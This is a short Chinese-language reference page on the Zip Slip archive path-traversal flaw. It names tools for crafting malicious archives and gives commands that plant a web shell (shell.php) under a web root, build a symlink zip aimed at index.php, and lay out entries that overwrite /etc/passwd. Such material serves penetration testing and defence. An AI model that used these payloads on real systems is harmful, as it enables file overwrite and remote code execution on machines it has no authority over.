# Zip Slip

> 该漏洞利用精心构造的存档文件（例如 ../../shell.php）来实现目录遍历攻击。Zip Slip 漏洞可以影响多种存档格式，包括 tar、jar、war、cpio、apk、rar 和 7z。攻击者随后可以覆盖可执行文件，并通过远程触发或等待系统或用户调用它们，从而在受害者的机器上实现远程命令执行。

## 总结

* [工具](#工具)
* [方法论](#方法论)
* [参考文献](#参考文献)

## 工具

* [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - 创建可以利用目录遍历漏洞的 tar/zip 存档文件
* [usdAG/slipit](https://github.com/usdAG/slipit) - 用于创建 ZipSlip 存档文件的实用程序

## 方法论

Zip Slip 漏洞是一种关键的安全缺陷，影响到对存档文件（如 ZIP、TAR 或其他压缩文件格式）的处理。此漏洞允许攻击者将任意文件写入目标提取目录之外的位置，可能覆盖关键系统文件、执行恶意代码或未经授权访问敏感信息。

**示例**：假设攻击者创建了一个具有以下结构的 ZIP 文件：

```ps1
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
```

当一个易受攻击的应用程序解压 `malicious.zip` 时，文件会被写入 `/etc/passwd` 和 `/usr/local/bin/malicious_script.sh` 而不是被限制在提取目录中。这可能导致严重后果，例如破坏系统文件或执行恶意脚本。

* 使用 [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)：

    ```python
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
    ```

* 创建包含符号链接的 ZIP 存档文件：

    ```ps1
    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    ```

有关受影响的库和项目的列表，请访问 [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)

## 参考文献

* [Zip Slip - Snyk - 2018 年 6 月 5 日](https://github.com/snyk/zip-slip-vulnerability)
* [Zip Slip 漏洞 - Snyk - 2018 年 4 月 15 日](https://snyk.io/research/zip-slip-vulnerability)